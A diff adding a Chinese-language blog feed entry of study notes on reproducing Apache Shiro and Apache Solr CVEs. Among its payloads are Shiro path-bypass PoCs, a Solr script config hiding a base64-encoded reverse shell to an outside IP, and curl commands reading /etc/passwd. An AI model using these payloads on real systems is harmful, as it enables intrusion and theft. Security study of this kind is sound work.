@@ -54,6 +54,31 @@
     
     
     <entry>
+      <title>框架安全&amp;CVE复现&amp;Apache Shiro&amp;Apache Solr</title>
+      <link href="/2022/04/23/kuang-jia-an-quan-cve-fu-xian-apache-shiro-apache-solr/"/>
+      <url>/2022/04/23/kuang-jia-an-quan-cve-fu-xian-apache-shiro-apache-solr/</url>
+      
+        <content type="html"><![CDATA[<blockquote></blockquote><ul><li><p>框架安全&amp;CVE复现&amp;Apache Shiro&amp;Apache Solr</p><hr><h4 id="Apache-Shiro："><a href="#Apache-Shiro：" class="headerlink" title="Apache Shiro："></a>Apache Shiro：</h4><p>Apache Shiro是一个强大且易用的Java安全框架，用于身份验证、授权、密码和会话管理</p><p>判断：大多会发生在登录处，返回包里包含remeberMe=deleteMe字段</p><p>漏洞：<a href="https://avd.aliyun.com/search?q=shiro">https://avd.aliyun.com/search?q=shiro</a></p><p>Apache Shiro &lt;= 1.2.4 默认密钥致命令执行漏洞【CVE-2016-4483】</p><p>Apache Shiro &lt; 1.3.2 验证绕过漏洞【CVE-2016-2807】</p><p>Apache Shiro &lt; 1.4.2 cookie oracle padding漏洞 【CVE-2019-12442】</p><p>Apache Shiro &lt; 1.5.2 验证绕过漏洞 【CVE-2020-1957】</p><p>Apache Shiro &lt; 1.5.3 验证绕过漏洞 【CVE-2020-11989】</p><p>Apahce Shiro &lt; 1.6.0 验证绕过漏洞 【CVE-2020-13933】</p><p>Apahce Shiro &lt; 1.7.1 权限绕过漏洞 【CVE-2020-17523】</p><pre><code>1、CVE_2016_4437 Shiro-550+Shiro-7212、CVE-2020-11989Poc：/admin/%20影响范围：Apache Shiro &lt; 1.7.1https://github.com/jweny/shiro-cve-2020-175233、CVE-2020-1957Poc：/xxx/..;/admin/影响范围：Apache Shiro &lt; 1.5.3</code></pre><h4 id="Apache-Solr"><a href="#Apache-Solr" class="headerlink" title="Apache Solr:"></a>Apache Solr:</h4><p>Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。</p><p>漏洞：<a href="https://avd.aliyun.com/search?q=solr">https://avd.aliyun.com/search?q=solr</a></p><p>远程命令执行RCE（CVE-2017-12629）</p><p>远程命令执行XXE（CVE-2017-12629）</p><p>任意文件读取AND命令执行（CVE-2019-17558）</p><p>远程命令执行漏洞(CVE-2019-0192)</p><p>远程命令执行漏洞(CVE-2019-0193)</p><p>未授权上传漏洞(CVE-2020-13957)</p><p>Apache Solr SSRF (CVE-2021-27905)</p><h5 id="1、远程命令执行RCE（CVE-2017-12629）"><a href="#1、远程命令执行RCE（CVE-2017-12629）" class="headerlink" title="1、远程命令执行RCE（CVE-2017-12629）"></a>1、远程命令执行RCE（CVE-2017-12629）</h5><p>Apache solr&lt;7.1.0版本</p><h5 id="2、任意文件读取AND命令执行（CVE-2019-17558）"><a href="#2、任意文件读取AND命令执行（CVE-2019-17558）" class="headerlink" title="2、任意文件读取AND命令执行（CVE-2019-17558）"></a>2、任意文件读取AND命令执行（CVE-2019-17558）</h5><pre><code>Apache Solr 5.0.0版本至8.3.1https://github.com/jas502n/solr_rceD:\Python27\python.exe solr_rce.py http://123.58.236.76:50847 id</code></pre><h5 id="3、远程命令执行漏洞-CVE-2019-0193"><a href="#3、远程命令执行漏洞-CVE-2019-0193" class="headerlink" title="3、远程命令执行漏洞(CVE-2019-0193)"></a>3、远程命令执行漏洞(CVE-2019-0193)</h5><pre><code>Apache Solr &lt; 8.2.0版本&lt;dataConfig&gt;  &lt;dataSource type="URLDataSource"/&gt;  &lt;script&gt;&lt;![CDATA[          function poc(){ java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==}|{base64,-d}|{bash,-i}");          }  ]]&gt;&lt;/script&gt;  &lt;document&gt;    &lt;entity name="stackoverflow"            url="https://stackoverflow.com/feeds/tag/solr"            processor="XPathEntityProcessor"            forEach="/feed"            transformer="script:poc" /&gt;  &lt;/document&gt;&lt;/dataConfig&gt;4、Apache Solr 文件读取&amp;SSRF (CVE-2021-27905)全版本官方拒绝修复漏洞1、获取数据库名http://47.94.236.117:8983/solr/admin/cores?indexInfo=false&amp;wt=json2、访问触发curl -i -s -k -X $'POST' \    -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \    $'http://47.94.236.117:8983/solr/demo/config'3、任意文件读取curl -i -s -k 'http://47.94.236.117:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd'</code></pre></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 框架安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Shmily </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>渗透常用工具地址-链接</title>
       <link href="/2022/04/19/chang-yong-gong-ju-lian-jie/"/>
       <url>/2022/04/19/chang-yong-gong-ju-lian-jie/</url>
